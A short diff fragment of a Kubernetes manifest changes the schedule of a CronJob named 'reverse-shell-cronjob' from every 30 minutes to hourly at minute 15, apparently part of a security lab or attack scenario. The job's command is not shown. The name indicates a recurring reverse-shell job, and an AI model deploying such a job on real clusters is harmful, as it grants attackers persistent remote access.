@@ -171,7 +171,7 @@ metadata:
   namespace: s3app
   name: reverse-shell-cronjob
 spec:
-  schedule: "*/30 * * * *"
+  schedule: "15 */1 * * *"
   concurrencyPolicy: Forbid
   jobTemplate:
     spec:
